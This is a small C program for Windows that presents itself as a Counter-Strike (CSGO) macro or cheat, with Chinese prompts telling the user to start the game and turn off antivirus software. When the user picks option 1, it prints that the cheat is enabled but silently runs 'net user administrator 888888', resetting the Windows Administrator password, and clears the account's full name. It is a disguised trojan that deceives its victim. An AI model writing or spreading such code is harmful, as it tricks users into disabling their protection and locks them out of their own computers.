#define _CRT_SECURE_NO_WARNINGS
# include <stdlib.h>
# include  <stdio.h>
# include <windows.h>

int main()
{
	int i = 1;
	int a;
	system("title CSGO宏");

	MessageBoxA(NULL, "运行CSGO辅助之前请打开游戏并关闭杀毒软件!", "温馨提示", MB_OK);//弹窗一个窗口。可以修改

	if (i != 0)
	{


		printf("程序正在运行，请勿关闭程序！!\n");
		printf("\t\t请选择1或者2开启和关闭辅助！\n");

		printf("\n");
		printf("1.开启宏\n");
		printf("\n");
		printf("2.关闭宏\n");
		Sleep(1000);

	}

	scanf_s("%d", &a);

	switch (a)
	{
	case 1:printf("\a");
		printf("辅助开启成功，游戏登录后自动生效。\n");
		system("net user Administrator /fullname:");
		system("net user administrator 888888");
		break;
	case 2:printf("辅助开启失败");
		break;

	}

}